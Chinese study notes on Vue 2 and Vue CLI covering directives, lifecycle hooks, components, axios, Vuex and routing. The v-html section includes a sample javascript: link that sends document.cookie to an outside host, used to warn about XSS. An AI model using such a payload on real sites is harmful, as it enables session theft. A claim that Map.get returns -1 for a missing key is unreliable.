一个网站 `BootCDN` ：有很多免费的第三方库，比如处理日期的：moment.js 或 day.js

```html
<div id="root">
	<h2>显示格式化后的时间</h2>
	<!-- 计算属性实现 -->
	<h3>现在是：{{fmtTime}}</h3>
	<!-- methods实现 -->
	<h3>现在是：{{getFmtTime()}}</h3>
	<!-- 过滤器实现 -->
	<h3>现在是：{{time | timeFormater}}</h3>
	<!-- 过滤器实现（传参） -->
	<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3> 
    <!-- 一级一级往后传，time 传给 timeFormater，timeFormater 的返回结果再传给 mySlice -->
	<h3 :x="msg | mySlice">尚硅谷</h3>
</div>
<div id="root2">
	<h2>{{msg | mySlice}}</h2>
</div>
```

```js
//全局过滤器，#root2容器中也能用
Vue.filter('mySlice',function(value){
	return value.slice(0,4) // 截取前4个字符
})
		
new Vue({
	el:'#root',
	data:{
		time:1621561377603, //时间戳
		msg:'你好，尚硅谷'
	},
	computed: {
		fmtTime(){
			return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
		}
	},
	methods: {
		getFmtTime(){
			return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
		}
	},
	//局部过滤器，只能在#root这个容器中使用
	filters:{
         // 有传入的str则以传入的str的格式为准，否则以这个为准
		timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){ 
			// console.log('@',value)
			return dayjs(value).format(str)
		}
	}
})
```

### 1-16 内置指令

#### 1. v-text指令

- 我们学过的指令：
  		v-bind	: 单向绑定解析表达式, 可简写为 :xxx
    		v-model : 双向数据绑定
    		v-for  	 : 遍历数组/对象/字符串
    		v-on       : 绑定事件监听, 可简写为@
    		v-if 	    : 条件渲染（动态控制节点是否存存在）
    		v-else    : 条件渲染（动态控制节点是否存存在）
    		v-show  : 条件渲染 (动态控制节点是否展示)
- v-text指令：
    		1. 作用：向其所在的节点中渲染文本内容。
        		2. 与插值语法的区别：v-text会`替换掉节点中的内容`，{{xx}}则不会。

```html
<div>你好，{{name}}</div>
<div v-text="name"></div>
<div v-html="str"></div>
```

```js
name:'你好啊',
str:'<h3>你好啊！</h3>',
str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
```

#### 2. v-html指令

1. 作用：向指定节点中渲染包含html结构的内容。

2. 与插值语法的区别：
   			(1). v-html会替换掉节点中所有的内容，{{xx}}则不会。
      			(2). v-html可以识别html结构。

3. 严重注意：v-html有安全性问题！！！！
   			(1). 在网站上动态渲染任意HTML是非常危险的，容易导致`XSS攻击`。
      			(2). 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

   ![cookie1](.\images\cookie1.png)

   ![cookie2](.\images\cookie2.png)

   ![cookie3](.\images\cookie3.png)

   一旦被别人获取到你的cookie（包含身份验证信息），他就能冒充你登录这个账号，很危险

   `document.cookie`可以获取cookie，不过不能获取`HttpOnly`打了√的cookie信息

#### 3. v-cloak指令（没有值）

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
2. 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}（闪现）的问题。

```html
<style>
	[v-cloak]{
		display:none;
	}
</style>

<h2 v-cloak>{{name}}</h2>
```

#### 4. v-once指令（没有值）

1. v-once所在节点在初次动态渲染后，就视为静态内容了。
2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```html
<h2 v-once>初始化的n值是:{{n}}</h2>
<h2>当前的n值是:{{n}}</h2>
<button @click="n++">点我n+1</button>
```

#### 5. v-pre指令（没有值）

1. 跳过其所在节点的编译过程。
2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

```html
<h2 v-pre>Vue其实很简单</h2>
<h2 >当前的n值是:{{n}}</h2>
<button @click="n++">点我n+1</button>
```

### 1-17 自定义指令

#### 1. 定义语法

1. 局部指令：

   ```
   new Vue({								new Vue({
   	directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
   }) 										})
   ```

2. 全局指令：

   ```
   Vue.directive(指令名,配置对象)     或        Vue.directive(指令名,回调函数)
   ```

#### 2. 配置对象中常用的3个回调

```
1. bind：指令与元素成功绑定时调用。
2. inserted：指令所在元素被插入页面时调用。
3. update：指令所在模板结构被重新解析时调用。
```

#### 3. 备注

 	1. 指令定义时不加v-，但使用时要加v-；
 	2. 指令名如果是多个单词，要使用`kebab-case`命名方式，不要用`camelCase`命名。并且若命名中有`-`，则必须用引号引起来（也就是用标准写法）

```
需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
```

```html
<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
<button @click="n++">点我n+1</button>
<input type="text" v-fbind:value="n">
```

```js
//定义全局指令
Vue.directive('fbind',{
	//指令与元素成功绑定时（一上来）
	bind(element,binding){
		element.value = binding.value
	},
	//指令所在元素被插入页面时
	inserted(element,binding){
		element.focus()
	},
	//指令所在的模板被重新解析时
	update(element,binding){
		element.value = binding.value
	}
})

new Vue({
    ...
    directives: {
        //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
        /* 'big-number'(element,binding){ //会传入两个值 element-元素(span) 和 binding-绑定的值(n)
        	element.innerText = binding.value * 10
        }, */
        big(element, binding) { // 此处是个函数，其实就是bind()和update()这两个回调
            console.log('big', this) //注意此处的this是window
            element.innerText = binding.value * 10
        },
        fbind: { // 此处是个对象，包含三个回调
            //指令与元素成功绑定时（一上来）
            bind(element, binding) {
                element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted(element, binding) {
                element.focus() // 让其所绑定的input元素获取焦点
            },
            //指令所在的模板被重新解析时
            update(element, binding) {
                element.value = binding.value
            }
        }
    }
})
```

### 1-18 生命周期

#### 1. 引出生命周期

1. 又名：生命周期回调函数、生命周期函数、生命周期钩子（常用说法）。
2. 是什么：Vue在关键时刻帮我们调用的一些特殊名称的`函数`。
3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
4. 生命周期函数中的this指向是`vm` 或 `组件实例对象`。

```html
<div id="root">
	<h2 :style="{opacity}">欢迎学习Vue</h2> <!-- 这里因为属性值属性名都是opacity，所以用了简写形式 -->
</div>
```

```js
new Vue({
    el: '#root',
    data: {
        opacity: 1
    },
    methods: {
        /* 如果把定时器写在这里，且在模板中用{{change()}}调用就会导致不断开启新的定时器，因为改变了opacity，模板就会重新渲染，于是又再次调用该方法，不断重复这个过程 */
    },
    //Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
    mounted() {
        console.log('mounted', this)
        setInterval(() => {
            this.opacity -= 0.01
            if (this.opacity <= 0) this.opacity = 1
        }, 16)
    },
})
//通过外部的定时器实现（不推荐）
/* setInterval(() => {
	vm.opacity -= 0.01
	if(vm.opacity <= 0) vm.opacity = 1
},16) */
```

#### 2. 分析生命周期

- 一共8个（4对）生命周期钩子，其实还有3个生命周期钩子没体现   ---  nextTick，activated，deactivated  ---

![生命周期](.\images\生命周期.png)

```html
<div id="root" :x="n">
    <h2 v-text="n"></h2>
    <h2>当前的n值是：{{n}}</h2>
    <button @click="add">点我n+1</button>
    <button @click="bye">点我销毁vm</button>
</div>
```

```js
new Vue({
    el: '#root',
    // 若把这个template当模板，则会把上面的div整个都替换掉，即包括<div id="root" :x="n"></div>容器
    // template:`
    // 	<div>
    // 		<h2>当前的n值是：{{n}}</h2>
    // 		<button @click="add">点我n+1</button>
    // 	</div>
    // `,
    data: {
        n: 1
    },
    methods: {
        add() {
            console.log('add')
            this.n++
        },
        bye() {
            console.log('bye')
            this.$destroy()
        }
    },
    watch: {
        n() {
            console.log('n变了')
        }
    },
    beforeCreate() {
        console.log('beforeCreate')
    },
    created() {
        console.log('created')
    },
    beforeMount() {
        console.log('beforeMount')
    },
    mounted() {
        console.log('mounted');
        // console.log(this.$el instaceof HTMLElement); // 这句话可以检测this.$el是不是一个真实DOM
    },
    beforeUpdate() {
        console.log('beforeUpdate');
        // debugger; // 加上这句可以在这里设置断点
    },
    updated() {
        console.log('updated')
    },
    beforeDestroy() {
        console.log('beforeDestroy')
    },
    destroyed() {
        console.log('destroyed')
    },
})
```

#### 3. 总结

1. 常用的生命周期钩子：
     		1. mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等`【初始化操作】`。
          		2. beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等`【收尾工作】`。
2. 关于销毁Vue实例
     		1. 销毁后借助Vue开发者工具看不到任何信息。
          		2. 销毁后自定义事件会失效，但原生DOM事件依然有效。(比如@click绑定的事件)
          		3. 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。



## 二、 Vue组件化编程

###  2-1. 模块与组件、模块化与组件化

#### 1.  模块 

1. 理解: 向外提供特定功能的 js 程序, 一般就是一个 js 文件 
2. 为什么要用模块: js 文件很多很复杂 
3. 作用: 复用 js, 简化 js 的编写, 提高 js 运行效率

#### 2. 组件 

1. 理解: 用来实现局部(特定)功能效果的代码集合(html/css/js/image…..) 
2. 为什么: 一个界面的功能很复杂
3. 作用: 复用编码, 简化项目编码, 提高运行效率

#### 3. 模块化

- 当应用中的 js 都以模块来编写的, 那这个应用就是一个模块化的应用

#### 4. 组件化

- 当应用中的功能都是多组件的方式来编写的, 那这个应用就是一个组件化的应用

### 2-2 非单文件组件

#### 1. 基本使用

1. Vue中使用组件的三大步骤
   - 定义组件(创建组件)
   - 注册组件
   - 使用组件(写组件标签)

2. 如何定义一个组件？

   - 使用`Vue.extend(options)`创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
     区别如下：
       		1. `el不要写`，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
       		2. `data必须写成函数`，为什么？ ———— 避免组件被复用时，数据存在引用关系。(写成函数，那每次调用都会返回一个新的对象，组件被复用时就不会存在冲突)
   - 备注：使用`template`可以配置组件结构（即HTML）。

3. 如何注册组件？

   1.局部注册：靠new Vue的时候传入components选项
   2.全局注册：靠Vue.component('组件名',组件)

4. 编写组件标签

   > <school></school>

```html
<div id="root">
	<hello></hello> <!-- 这里用的是小写，但开发者工具中会自动首字母大写 -->
	<h1>{{msg}}</h1>
	<!-- 第三步：编写组件标签 -->
	<school></school>
	<!-- 第三步：编写组件标签 -->
	<student></student>
</div>
<div id="root2">
	<hello></hello>
</div>
```

```js
//第一步：创建school组件，这里定义组件时只是临时起的名字，真正当标签用时的名字是在components中注册的
const school = Vue.extend({
	template:`
		<div class="demo">
			<h2>学校名称：{{schoolName}}</h2>
			<h2>学校地址：{{address}}</h2>
			<button @click="showName">点我提示学校名</button>	
		</div>
	`,
	// el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
	data(){
		return {
			schoolName:'尚硅谷',
			address:'北京昌平'
		}
	},
	methods: {
		showName(){
			alert(this.schoolName)
		}
	},
})
//第一步：创建hello组件
const hello = Vue.extend({
	template:`
		<div>	
			<h2>你好啊！{{name}}</h2>
		</div>
	`,
	data(){
		return {
			name:'Tom'
		}
	}
})
		
//第二步：全局注册组件
Vue.component('hello',hello)
//创建vm
new Vue({
	el:'#root',
	data:{
		msg:'你好啊！'
	},
	//第二步：注册组件（局部注册）
	components:{ // 这里也是用了对象的简写形式 shool:shool → shool(当然属性名可以再定义为别的，但没必要)
		school,
		student
	}
})
new Vue({
	el:'#root2',
})
```

#### 2. 几个注意点

1. 关于组件名
   - 一个单词组成：
     		1）第一种写法(首字母小写)：school
       		2）第二种写法(首字母大写)：School（开发中常用）
   - 多个单词组成：
     		1）第一种写法(kebab-case命名)：my-school
       		2）第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持，否则会自动将标签转为小写)（常用）
   - 备注：
     		1）组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
       		2）可以使用`name配置项`指定组件在`开发者工具`中呈现的名字。
2. 关于组件标签
   - 第一种写法：<school> </school>
   - 第二种写法：<school/>
   - 备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。
3. 一个简写方式
   - `const school = Vue.extend(options)` 可简写为：`const school = options`

#### 3. 组件的嵌套

- 一般都会用一个`app`组件来管理所有的组件

```html
<!-- 准备好一个容器-->
<div id="root"></div>
```

```js
//定义student组件，必须在school之前定义，因为school要用
const student = Vue.extend({
	name:'student',
	template:`
		<div>
			<h2>学生姓名：{{name}}</h2>	
			<h2>学生年龄：{{age}}</h2>	
		</div>
	`,
	data(){
		return {
			name:'尚硅谷',
			age:18
		}
	}
})	
//定义school组件
const school = Vue.extend({
	name:'school',
	template:`
		<div>
			<h2>学校名称：{{name}}</h2>	
			<h2>学校地址：{{address}}</h2>	
			<student></student>
		</div>
	`,
	data(){
		return {
			name:'尚硅谷',
			address:'北京'
		}
	},
	//注册组件（局部）
	components:{
		student
	}
})
//定义hello组件
const hello = Vue.extend({
	template:`<h1>{{msg}}</h1>`,
	data(){
		return {
			msg:'欢迎来到尚硅谷学习！'
		}
	}
})
		
//定义app组件
const app = Vue.extend({
	template:`
		<div>	
			<hello></hello>
			<school></school>
		</div>
	`,
	components:{
		school,
		hello
	}
})
//创建vm
new Vue({
	template:'<app></app>', // 写在这里的好处是：让上面的#root容器看起来干干净净
	el:'#root',
	//注册组件（局部）
	components:{app}
})
```

#### 4. VueComponent

1. school组件本质是一个名为`VueComponent`的构造函数，且不是程序员定义的，是`Vue.extend`生成的。
2. 我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
   	即Vue帮我们执行的：`new VueComponent(options)`。
3. 特别注意：每次调用Vue.extend，返回的都是一个`全新的VueComponent`！！！！
4. 关于this指向：
   - 组件配置中：
     data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
   - new Vue(options)配置中：
     data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。
5. VueComponent的实例对象，以后简称`vc`（也可称之为：组件实例对象）。
   	Vue的实例对象，以后简称`vm`。

#### 5. 一个重要的内置关系

1. 一个重要的内置关系：`VueComponent.prototype.__proto__ === Vue.prototype`
2. 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

![分析Vue与VueComponent的关系](.\images\分析Vue与VueComponent的关系.png)

#### 6. others

1. 模板编写没有提示 
2. 没有构建过程, 无法将 ES6 转换成 ES5 
3. 不支持组件的 CSS 
4. 真正开发中几乎不用

### 2-3 单文件组件

- 要让VScode认识.vue文件，高亮显示代码，须安装插件`Vtur`，只要打`<v`回车，就可以搭建一个默认结构

#### 1.  一个.vue 文件的组成(3 个部分)

1. 模板页面

   ```vue
   <template>
   	页面模板
   </template>
   ```

1. JS 模块对象

   ```vue
   <script>
       export default {
           data() {return {}}, 
           methods: {}, 
           computed: {}, 
           components: {}
       }
   </script>
   ```

2. 样式

   ```vue
   <style>
   	样式定义
   </style>
   ```

#### 2. 基本使用

1. 引入组件 `import School from './components/School'`
2. 映射成标签 `components:{School}`
3. 使用组件标签 `<School></School>`



## 三、Vue脚手架（Vue CLI）

### 3-1  初始化脚手架

#### 1. 简介

- Vue 脚手架是 Vue 官方提供的标准化开发工具（开发平台）。
- 官网 [https://cli.vuejs.org/zh/](https://cli.vuejs.org/zh/)
- cli：命令行接口（command-line interface）

#### 2. 步骤

1. （仅第一次执行）：全局安装@vue/cli。

   `npm install -g @vue/cli`

2. 切换到你要创建项目的目录，然后使用命令创建项目(eg. 创建项目hello-world)

   `vue create hello-world`

3. 启动项目（开启内置服务器8080用以支持项目运行）

   `npm run serve`
   
4. 打包项目，将完成的项目打包生成一个dist文件夹（包含html，css，js，favicon.ico文件等静态资源）

   `npm run build`

### 3-2 本章笔记的核心内容在另一个文件里 （Vue 脚手架）

### 3-3 补充

#### 1. 指令

- 如出现下载缓慢请配置 npm 淘宝镜像：

  `npm config set registry https://registry.npm.taobao.org`

- Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpakc 配置， 请执行：

  `vue inspect > output.js`

  就会导出一个output.js文件以便查看配置

- 只要在当前文件夹的url中输入cmd，就可以在当前目录打开命令行工具

- 在当前目录下新建一个文件夹

  `mkdir 文件夹名`

- 清空历史命令

  `cls`

- 运行 npm run serve 之后按 ctrl+c ，此时回答y/n都会停止当前运行的工程，一般再按一次ctrl+c

- 在VScode中打开终端，可以在菜单栏终端→新终端打开，也可以按快捷键，点击终端旁边的+号可以继续写指令，不用把工程给停掉

- 查看webpack的所有版本（目前vue用的是4的最新版本）

  `npm view webpack versions`

- 查看less-loader的所有版本

  `npm view less-loader versions

  要用less语法写样式，须先安装less-loader插件，最新的less-loader是为5.xxx版本的webpack服务的，所以建议安装7版本的，运行如下命令就会自动安装7里的最新版本

  `npm i less-loader@7`

#### 2. 生成id的方法

1. `uuid库`可以生成全球唯一的字符串，这个库很大

2. `nanoid`是uuid的迷你版，库没这么大，生成的字符串也没这么长这么复杂，采用分别暴露

   安装指令： `npm i nanoid`

#### 3. VScode插件

1. `Vetur` 让VScode认识vue文件，代码高亮显示
2. `Vue 3 Snippets` 写vue代码会有代码提示
3. `Open in External App` 用外置的app打开文件，就可以选中文件，右键选择用外置app打开文件，就可以快速查看了

#### 4. 一些方法

1. `str.trim()` ：过滤空格

2. `arrs.forEach( arr => {...} )` ：遍历数组arr

3. `arrs.filter( arr => {...} )` ：过滤数组，返回 返回值为true的arr集合，当`...`只有一条语句时，`{}`可省略

4. `arrs.reduce()` ：用于做条件统计

   ```js
   doneTotal() { // 统计完成的任务数
   	return this.todos.reduce( (pre, todo) => pre 
   + (todo.done ? 1 : 0), 0 ) // (回调函数，初始值)
   },
   ```

5. `arrs.indexOf()`：返回在数组中可以找到一个给定元素的第一个索引，如果不存在，则返回-1。

   `arrs.lastIndexOf()`：返回指定元素（也即有效的 JavaScript 值或变量）在数组中的最后一个的索引，如果不存在则返回 -1，和indexOf()一样第一个参数是待查找元素，第二个参数可选，是开始查找的位置

6. `map.get( key )`：返回对象中的一个指定元素，key是键，返回的是其对应的值，若没能找到，则返回-1

   `map.set( key )`：为对象添加或更新一个指定了键（`key`）和值（`value`）的（新）键值对。

   ```JS
   const map = new Map();
   map.set('bar', 'foo');
   console.log(map.get('bar')); // "foo"
   ```

7. `map.entries( key )`：返回一个新的包含 `[key, value]` 对的 `Iterator` 对象，返回的迭代器的迭代顺序与 `map` 对象的插入顺序相同。

   ```JS
   const iterator = map.entries();
   for(const mp of iterator) {
       console.log(mp); // Array ["bar", "foo"]
   }
   ```

#### 5. 第三方库

- 引入库的时候，如果是第三方的往上放，自己写的往下放
- `npm`：有很多插件，直接搜索即可
  1. `animate.css` ：动画效果

### 3-4 一些效果的实现

#### 1. 点击编辑变成文本框

- 在子组件中，准备一个span和一个input文本框，根据isEdit属性值选择显示哪个，然后绑定点击事件，编写对应的事件处理回调函数
- 因为一开始数据中没有isEdit，所以其值为false，默认只显示span

```html
<span v-show="!todo.isEdit">{{todo.title}}</span>
<input 
	type="text" 
	v-show="todo.isEdit"
	:value="todo.title"
	@blur="handleBlur(todo, $event)"
	ref="inputTitle"
>
<button class="btn btn-edit" @click="handleEdit(todo)">编辑</button>
```

```js
handleEdit(todo) {
	if(todo.hasOwnProperty('isEdit')) { // 判断todo中有无isEdit属性
		todo.isEdit = true
	} else {
		this.$set(todo, 'isEdit', true)
	}
	this.$nextTick(function() { // 在下一次 DOM 更新结束后执行其指定的回调
		this.$refs.inputTitle.focus() // 获取焦点
	})
},
handleBlur(todo, e) { // 失去焦点的事件处理函数
	todo.isEdit = false
	if(!e.target.value.trim()) {
		return alert("输入不能为空")
	}
	this.$bus.$emit('updateTodo', todo.id, e.target.value) // 使用App组件中的方法
}
```

在App组件中编写更新todos数据的函数

```js
updateTodo(id, title) {
	this.todos.forEach(todo => {
		if(todo.id == id) {
			todo.title = title
		}
	})
}
```

#### 2. 动画效果

```vue
<!-- MyList.vue中用transition-group标签把MyItem包裹起来 -->
<transition-group name="todo">
	<MyItem 
		v-for="todo in todos" 
		:key="todo.id"
		:todo="todo"
	/>
</transition-group>
```

## 四、Vue中的ajax

运行 `node server1` ：得到 `服务器server1启动成功了,请求学生信息地址为：http://localhost:5000/students`

### 4-1 常用的发送一个ajax请求的方式

1. xhr：`new XMLHttpRequest()`   `xhr.open()`   `xhr.send()` 是鼻祖，但实际开发中不常用，一般都是对它进行二次封装，比如 jQuery，axios，v-resource
2. jQuery：`$get` `$post` 实际开发中也不常用，其核心是封装DOM操作，而用 react 和 vue 的目的就是减少DOM操作
3. axios：最常用
4. fetch：常用，和 xhr 平级，xhr是js内置的（或者说是window里面有`XMLHttpRequest()`方法），直接就能new一个xhr来用；而fetch也是，window内置对象中直接就有一个fetch方法，直接就能用，直接就能发送请求，且也是promise风格，但它会把返回的数据包两层promise，且其兼容性稍差，IE上不可用
5. v-resource：vue 插件库, vue1.x 使用广泛，官方已不维护，交由其他团队维护，了解即可

综上，推荐在vue中用axios，并且vue官方也是这么推荐的

### 4-2 axios

1. 安装和引入axios：

   ```
   npm i axios
   ```

   ```js
   import axios from 'axios'
   ```

2. 语法：`axios.get(url).then(respond => {})`

3. 跨域：即违背了同源策略

   `http://localhost:8080/` 

   `http 协议名`  `localhost 主机名` `8080 端口号`

   同源策略规定，协议名、主机名、端口号必须一致，而数据请求中服务器端口号5000与8080不一致，于是浏览器发送了请求→服务器收到了并且返回了→但浏览器没给前端，前端拿不到

4. 如何解决跨域问题

   - cors：需麻烦后端人员
   - jsonp：巧妙借用了script src引入资源时不受同源策略限制的特点，但前后端都要麻烦，且只能解决get请求问题，post之类的还是不行（开发中很少用，但面试中常问）
   - 配置一个代理服务器：常用，代理服务器的端口号同前端的一致，浏览器8080 - 代理服务器8080 - 数据请求服务器5000，那么浏览器向代理服务器请求数据就没有跨域问题了，而服务器与服务器之间不用ajax，用传统的http请求就好了

5. 开启8080代理服务器

   - nginx：学习成本高一些，且需要对后端有一定的了解
   - vue-cli：简单一些，在vue.config.js中配置，因为修改了脚手架配置，所以配置后记得把脚手架停掉重新运行

6. 更多详情查看另一个文件中的'Vue中的ajax'

### 4-3 vue-resource使用步骤

1. 安装、引入和使用

   ```
   npm i vue-resource
   ```

   ```js
   import vueResource from 'vue-resource' 
   // 因为vue-resource采用的是默认暴露，所以vueResource这个名字是可以自己定的，不过就写成这样比较好
   Vue.use(vueResource)
   // 使用之后，整个应用当中所有vue实例(vm)和所有组件实例对象(vc)都多了个东东 $http
   ```

2. 和ajax的使用几乎一样，只需在请求数据时，将axios改为this.$http

   语法：`this.$http.get(url).then(respond => {})`

### 4-4  本章笔记的核心内容在另一个文件里 （Vue中的ajax）

### 4-5 github 用户搜索案例（axios实现）

1. 拆分组件：`Search` 和 `List` 两个组件

2. 引入bootstrap.css文件：

   - 在`main.js`中引入 --main.js是入口文件，不建议在这引入

   - 在`App.vue`中引入  --须先在src中创建一个assets静态资源文件夹-css文件夹-把bootstrap.css文件放进去，引入`import './assets/css/bootstrap.css'`，但是这个css样式中用到了Bootstrap自带的fonts文件夹里的资源，所以不引入的话会报错，但是这个案例中没有用到fonts，没必要专门去引入font，此时建议第三种方式

   - 在`index.html`中引入  --须先在public中创建一个css文件夹，把bootstrap.css文件放进去

     ```html
     <!-- 引入第三方样式 -->
     <link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">
     ```

3. 请求数据：

   - 接口地址：`https://api.github.com/search/users?q=xxx`

   - 因为是List要展示数据，所以要将数据交给List

   - 先在Search中请求数据，然后将请求成功后的数据交给List

   ```js
   searchUsers(){
   	//请求前更新List的数据，以对象形式接受更符合语义化规范，也更方便
   	this.$bus.$emit('updateListData',{isFirst:false,isLoading:true,errMsg:'',users:[]}) //顺序可调
   	axios.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
   		response => {
   			//请求成功后更新List的数据，因为isFirst只在最初请求数据时修改一次即可，所以这里无须传这个值
   			this.$bus.$emit('updateListData',{isLoading:false,errMsg:'',users:response.data.items})
   		},
   		error => {
   			//请求后更新List的数据，同理无须传isFirst值
   			this.$bus.$emit('updateListData',{isLoading:false,errMsg:error.message,users:[]})
   		}
   	)
   }
   ```

   ```js
   data() {
   	return {
   		info:{
   			isFirst:true,
   			isLoading:false,
   			errMsg:'',
   			users:[]
   		}
   	}
   },
   mounted() {
   	this.$bus.$on('updateListData',(dataObj)=>{
   		this.info = {...this.info,...dataObj} // 合并这两个对象里的数据，两者都有的以后者为准
   	})
   },
   ```

## 五、Vuex

### 5-1 Vuex工作原理

![vuex](.\images\vuex.png)

![vuex过程解析](.\images\vuex过程解析.png)

### 5-2 求和案例

1. 选项里的value值会被解析成字符串（不管加不加引号），解决方案如下：

   ```html
   <!-- 1. 在v-model后加上.number（推荐这个，简单）;  
   	 2. 给每个value加:绑定，那么就会把引号里的解析成js语法 -->
   <select v-model.number="n">
   	<option value="1">1</option>
   	<option value="2">2</option>
   	<option value="3">3</option>
   </select>
   ```

2. Vuex版本见另一个文件Vuex

### 5-3 开发者工具Devtools的使用

![Vuex开发者工具](.\images\Vuex开发者工具.png)

### 5-4 本章笔记的核心内容在另一个文件里 （Vuex）

### 5-5 补充

1. actions中的上下文context：包含dispatch、commit、state等可能会用到的东西
   - dispatch：比如处理太繁琐，将一些事情派遣给另一个函数`dispatch('jiaOdd', value)`
   - commit方法：调用mutations中的函数`context.commit('JIA',value)`
   - state：读取状态 `context.state.sum`，其实在这里也能操作数据，但不建议这么做，因为不通过mutations的话开发者工具就捕获不到动作了

2. 为什么要把业务逻辑写在actions，而不直接写在组件里？
   - 因为写在actions里，那这个工程里的所有vm和vc就都能复用这个业务逻辑，尤其是当业务逻辑复杂时

## 六、路由

### 6-1  SPA单页面应用

1. 概念：单页Web应用（single page web application，SPA），就是只有一张Web页面的应用，是加载单个HTML 页面并在用户与应用程序交互时动态更新该页面的Web应用程序。浏览器一开始会加载必需的HTML、CSS和JavaScript，所有的操作都在这张页面上完成，都由JavaScript来控制。用 JavaScript 动态的变换 HTML（采用的是 div 切换显示和隐藏），而不会重新加载或跳转页面

![单页面应用](.\images\单页面应用.png)

2. 特点：

   - 单页 Web 应用（single page web application，SPA）：整个应用只有一个完整的页面。

   - 速度：更好的用户体验，让用户在web app感受native app的速度和流畅
   - MVVM：经典MVVM开发模式，前后端各负其责
   - ajax：重前端，业务逻辑全部在本地操作，数据都需要通过AJAX同步、提交
   - 路由：在URL中采用#号来作为当前视图的地址,改变#号后的参数，页面并不会重载。点击页面中的导航链接不会刷新页面，只会做页面的局部更新。 

## 七、Vue UI 组件库

### 7-1 移动端常用 UI 组件库 

1. Vant  https://youzan.github.io/vant
2. Cube UI https://didi.github.io/cube-ui 
3. Mint UI http://mint-ui.github.io 

### 7-2 PC 端常用 UI 组件库

1. Element UI https://element.eleme.cn   (国产，饿了么打造的，基于vue框架)
2. IView UI https://www.iviewui.com （基于vue）
3. Ant Design Vue https://2x.antdv.com/docs/vue/getting-started-cn （蚂蚁金服打造，基于vue）

### 7-3  使用

```js
//完整引入
//引入ElementUI组件库
// import ElementUI from 'element-ui';
//引入ElementUI全部样式
// import 'element-ui/lib/theme-chalk/index.css';

//按需引入
import { Button,Row,DatePicker } from 'element-ui';

//应用ElementUI
// Vue.use(ElementUI);
Vue.component('atguigu-button', Button);
Vue.component('atguigu-row', Row);
Vue.component('atguigu-date-picker', DatePicker);
```

### 7-4 建议

平时可以打开那些组件网站看看有哪些组件，要用的时候就知道去哪里找，有个印象

## 八、Vue3

### 1. 笔记见`Vue3快速上手.md`

### 2. 补充

1. $attrs：vc中的一个属性，是个对象，包含父组件传的值（未用props接收的，props接收了的值不会出现在$attrs中）
2. $slot：父组件在子组件标签写的内容（即插槽的内容）会以数组的形式被保存在子组件的$slot属性中

3. 遮罩层样式：

   ```css
   .mask{
   	position: absolute;
   	top: 0; bottom: 0; left: 0; right: 0; /*让遮罩层占满整个body*/
   	background-color: rgba(0, 0, 0, 0.5);
   }
   ```

   